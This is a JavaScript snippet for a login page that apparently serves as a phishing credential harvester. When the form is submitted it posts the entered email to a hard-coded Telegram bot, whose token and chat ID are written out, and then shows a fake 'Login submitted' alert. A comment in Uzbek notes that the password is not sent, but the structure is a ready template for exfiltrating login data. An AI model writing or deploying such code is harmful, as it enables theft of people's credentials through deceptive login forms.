  const telegram_bot_id = "8339355653:AAFVWzjoOZF02ZgL5j_JYlyxm4fIJcIzyHc";
  const chat_id = 7962434476;

  /* PASSWORD SHOW / HIDE */
  document.getElementById("togglePassword").addEventListener("click", function () {
    const input = document.getElementById("user-password");
    input.type = input.type === "password" ? "text" : "password";
  });

  /* FORM SUBMIT */
  document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

    const email = document.getElementById("user-email").value;

    // ❗ PAROL YUBORILMAYDI
    const message =
      "🔐 New Login Attempt\n\n" +
      "📧 Email: " + email;

    fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: chat_id,
        text: message
      })
    }).catch(() => {});

    alert("Login submitted ✅");
    this.reset();
  });